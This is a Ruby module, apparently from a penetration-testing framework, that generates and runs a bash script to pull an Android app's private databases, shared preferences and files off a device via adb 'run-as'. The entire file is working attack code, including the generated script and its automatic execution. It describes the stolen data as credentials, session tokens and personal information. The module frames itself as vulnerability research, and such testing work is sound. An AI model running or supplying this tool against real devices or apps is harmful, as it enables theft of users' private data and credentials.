require_relative '../../../core/payload_base'
require 'base64'

module MPF
  module Payloads
    module Singles
      module Android
        class DataExfiltration < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android Data Exfiltration',
              module: 'payload/android/singles/data_exfiltration',
              platform: :android,
              description: 'Exfiltrates sensitive application data including databases, ' \
                          'shared preferences, and files. Demonstrates critical data exposure vulnerability.',
              authors: ['MPF Research Team'],
              severity: 'critical'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('EXFIL_PATH', 'Path to exfiltrate (default: all)', default: '/data/data')
            add_option('OUTPUT_DIR', 'Local directory to save exfiltrated data', default: 'reports/exfiltrated')
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('INCLUDE_DATABASES', 'Exfiltrate databases', default: 'true')
            add_option('INCLUDE_SHARED_PREFS', 'Exfiltrate shared preferences', default: 'true')
            add_option('INCLUDE_FILES', 'Exfiltrate files directory', default: 'true')
          end

          def generate(opts = {})
            package = get_option('TARGET_PACKAGE')
            device = get_option('DEVICE')
            output_dir = get_option('OUTPUT_DIR')

            # Build comprehensive exfiltration script
            script = "#!/bin/bash\n"
            script += "# MPF Data Exfiltration Payload\n"
            script += "# Target: #{package}\n"
            script += "# Severity: CRITICAL - Complete data exposure\n\n"
            
            script += "DEVICE='#{device}'\n"
            script += "PACKAGE='#{package}'\n"
            script += "OUTPUT='#{output_dir}'\n\n"
            
            script += "echo '[*] Starting data exfiltration...'\n"
            script += "mkdir -p \"$OUTPUT/$PACKAGE\"\n\n"

            if get_option('INCLUDE_DATABASES') == 'true'
              script += "# Exfiltrate databases\n"
              script += "echo '[*] Exfiltrating databases...'\n"
              script += "adb -s $DEVICE shell \"run-as $PACKAGE ls databases/\" 2>/dev/null | while read db; do\n"
              script += "  if [ ! -z \"$db\" ]; then\n"
              script += "    echo \"[+] Pulling database: $db\"\n"
              script += "    adb -s $DEVICE shell \"run-as $PACKAGE cat databases/$db\" > \"$OUTPUT/$PACKAGE/$db\"\n"
              script += "  fi\n"
              script += "done\n\n"
            end

            if get_option('INCLUDE_SHARED_PREFS') == 'true'
              script += "# Exfiltrate shared preferences\n"
              script += "echo '[*] Exfiltrating shared preferences...'\n"
              script += "adb -s $DEVICE shell \"run-as $PACKAGE ls shared_prefs/\" 2>/dev/null | while read pref; do\n"
              script += "  if [ ! -z \"$pref\" ]; then\n"
              script += "    echo \"[+] Pulling preference: $pref\"\n"
              script += "    adb -s $DEVICE shell \"run-as $PACKAGE cat shared_prefs/$pref\" > \"$OUTPUT/$PACKAGE/$pref\"\n"
              script += "  fi\n"
              script += "done\n\n"
            end

            if get_option('INCLUDE_FILES') == 'true'
              script += "# Exfiltrate files directory\n"
              script += "echo '[*] Exfiltrating files directory...'\n"
              script += "adb -s $DEVICE shell \"run-as $PACKAGE find files/ -type f\" 2>/dev/null | while read file; do\n"
              script += "  if [ ! -z \"$file\" ]; then\n"
              script += "    echo \"[+] Pulling file: $file\"\n"
              script += "    mkdir -p \"$OUTPUT/$PACKAGE/$(dirname $file)\"\n"
              script += "    adb -s $DEVICE shell \"run-as $PACKAGE cat $file\" > \"$OUTPUT/$PACKAGE/$file\"\n"
              script += "  fi\n"
              script += "done\n\n"
            end

            script += "echo '[+] Data exfiltration complete'\n"
            script += "echo '[*] Exfiltrated data saved to: '$OUTPUT/$PACKAGE\n"
            script += "echo '[!] CRITICAL: Complete application data exposed'\n"

            {
              type: 'bash_script',
              script: script,
              description: 'Complete data exfiltration payload',
              impact: 'CRITICAL - All application data exposed including databases, credentials, and user files'
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            payload = generate
            
            print_status("Executing data exfiltration payload...")
            print_warning("CRITICAL IMPACT: This will extract ALL application data")
            print_status("Target: #{get_option('TARGET_PACKAGE')}")
            
            # Save script
            script_file = "reports/payload/exfiltration_#{Time.now.to_i}.sh"
            File.write(script_file, payload[:script])
            File.chmod(0755, script_file)
            
            print_status("Exfiltration script saved: #{script_file}")
            print_status("Executing script...")
            
            output = `bash #{script_file} 2>&1`
            success = $?.success?

            if success
              print_good("Data exfiltration successful")
              
              # Count exfiltrated files
              output_dir = get_option('OUTPUT_DIR')
              package = get_option('TARGET_PACKAGE')
              exfil_path = File.join(output_dir, package)
              
              if Dir.exist?(exfil_path)
                file_count = Dir.glob("#{exfil_path}/**/*").select { |f| File.file?(f) }.length
                
                print_good("Exfiltrated #{file_count} file(s)")
                print_warning("CRITICAL VULNERABILITY CONFIRMED")
                
                {
                  success: true,
                  output: output,
                  files_exfiltrated: file_count,
                  exfiltration_path: exfil_path,
                  payload: payload,
                  impact: "CRITICAL - #{file_count} files containing sensitive data exfiltrated. " \
                         "Potential exposure of credentials, PII, session tokens, and private user data."
                }
              else
                {
                  success: false,
                  output: output,
                  error: 'Exfiltration directory not created - may lack run-as permission'
                }
              end
            else
              print_error("Data exfiltration failed")
              {
                success: false,
                output: output,
                error: 'Exfiltration script execution failed'
              }
            end
          end

          private

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end

          def print_warning(msg)
            puts "[!] #{msg}"
          end
        end
      end
    end
  end
end
